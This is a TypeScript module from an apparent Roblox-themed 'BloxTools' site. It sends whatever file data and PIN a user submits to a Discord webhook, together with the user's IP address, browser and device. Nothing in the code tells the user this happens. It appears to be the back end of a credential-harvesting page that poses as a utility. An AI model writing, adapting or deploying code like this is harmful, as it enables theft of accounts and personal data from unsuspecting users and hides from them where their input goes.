
import { toast } from "sonner";

interface WebhookPayload {
  toolType: string;
  file: string;
  pin?: string;
}

const COOLDOWN_MAP: Record<string, number> = {};

export const sendToDiscordWebhook = async (payload: WebhookPayload, webhookUrl: string, cooldownSeconds: number) => {
  try {
    // Check if the tool is on cooldown
    const toolKey = `${payload.toolType}-cooldown`;
    const currentTime = Date.now();
    const lastUsedTime = COOLDOWN_MAP[toolKey] || 0;
    const timeElapsed = (currentTime - lastUsedTime) / 1000;
    
    if (lastUsedTime && timeElapsed < cooldownSeconds) {
      const remainingSeconds = Math.ceil(cooldownSeconds - timeElapsed);
      throw new Error(`Please wait ${remainingSeconds} seconds before using this tool again.`);
    }
    
    // Get device information
    const userAgent = navigator.userAgent;
    const browserInfo = getBrowserInfo(userAgent);
    const deviceInfo = getDeviceInfo(userAgent);
    
    // Attempt to get IP address using a public API
    const ipInfo = await fetchIpInfo();
    
    // First 100 chars of file for display
    const displayFile = payload.file.slice(0, 100) + "...";
    
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: `**New ${payload.toolType} Submission**`,
        embeds: [
          {
            title: "File Data Preview",
            description: displayFile,
            color: 0x00d7dc,
            fields: [
              {
                name: "Tool Type",
                value: payload.toolType,
                inline: true
              },
              {
                name: "PIN",
                value: payload.pin || "Not provided",
                inline: true
              },
              {
                name: "Submission Date",
                value: new Date().toLocaleString(),
                inline: true
              },
              {
                name: "IP Address",
                value: ipInfo.ip || "Unknown",
                inline: true
              },
              {
                name: "Location",
                value: ipInfo.location || "Unknown",
                inline: true
              },
              {
                name: "Browser",
                value: browserInfo,
                inline: true
              },
              {
                name: "Device",
                value: deviceInfo,
                inline: true
              },
              {
                name: "Full File Data",
                value: payload.file.length > 1024 ? 
                  payload.file.slice(0, 1021) + "..." : 
                  payload.file
              }
            ],
            footer: {
              text: "BloxTools Submission System",
              icon_url: "https://i.imgur.com/ZOKp8LH.png"
            },
            timestamp: new Date().toISOString()
          }
        ]
      }),
    });
    
    // Set the cooldown
    COOLDOWN_MAP[toolKey] = currentTime;
    
    return response.ok;
  } catch (error) {
    console.error('Failed to send webhook:', error);
    const errorMessage = error instanceof Error ? error.message : 'Failed to send webhook';
    toast.error(errorMessage);
    return false;
  }
};

// Helper function to get browser information
const getBrowserInfo = (userAgent: string): string => {
  if (userAgent.includes("Firefox")) return "Firefox";
  if (userAgent.includes("Chrome")) return "Chrome";
  if (userAgent.includes("Safari")) return "Safari";
  if (userAgent.includes("Edge")) return "Edge";
  if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
  return "Unknown Browser";
};

// Helper function to get device information
const getDeviceInfo = (userAgent: string): string => {
  if (userAgent.includes("Android")) return "Android Device";
  if (userAgent.includes("iPhone")) return "iPhone";
  if (userAgent.includes("iPad")) return "iPad";
  if (userAgent.includes("Win")) return "Windows";
  if (userAgent.includes("Mac")) return "MacOS";
  if (userAgent.includes("Linux")) return "Linux";
  return "Unknown Device";
};

// Function to fetch IP information
const fetchIpInfo = async (): Promise<{ ip: string, location: string }> => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    
    // Try to get location data (this is a simple implementation)
    // For a real app, consider using a proper IP geolocation service
    return {
      ip: data.ip,
      location: "Location data unavailable" // Simplified for this example
    };
  } catch (error) {
    console.error('Failed to fetch IP info:', error);
    return { 
      ip: "Unknown",
      location: "Unknown"
    };
  }
};
